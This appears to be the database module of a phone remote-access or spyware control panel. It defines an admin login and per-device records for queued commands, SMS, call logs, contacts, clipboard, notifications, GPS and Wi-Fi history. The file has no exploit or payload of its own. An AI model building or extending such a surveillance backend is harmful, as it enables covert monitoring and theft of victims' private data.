const lowdb = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');
const fs = require('fs');

// Helper: ensure directory exists
function ensureDir(dir) {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
}

// Helper: choose writable location
function getWritablePath(relativePath) {
    const cwdPath = path.join(process.cwd(), relativePath);
    try {
        fs.accessSync(path.dirname(cwdPath), fs.constants.W_OK);
        return cwdPath;
    } catch {
        const tmpPath = path.join('/tmp', relativePath);
        ensureDir(path.dirname(tmpPath));
        if (!fs.existsSync(tmpPath)) {
            fs.writeFileSync(tmpPath, '{}');
        }
        return tmpPath;
    }
}

// Main DB
const adapter = new FileSync(getWritablePath('maindb.json'));
const db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write();

// Client DB class
class clientdb {
    constructor(clientID) {
        const clientPath = getWritablePath(`clientData/${clientID}.json`);
        const cdb = lowdb(new FileSync(clientPath));

        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write();

        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};
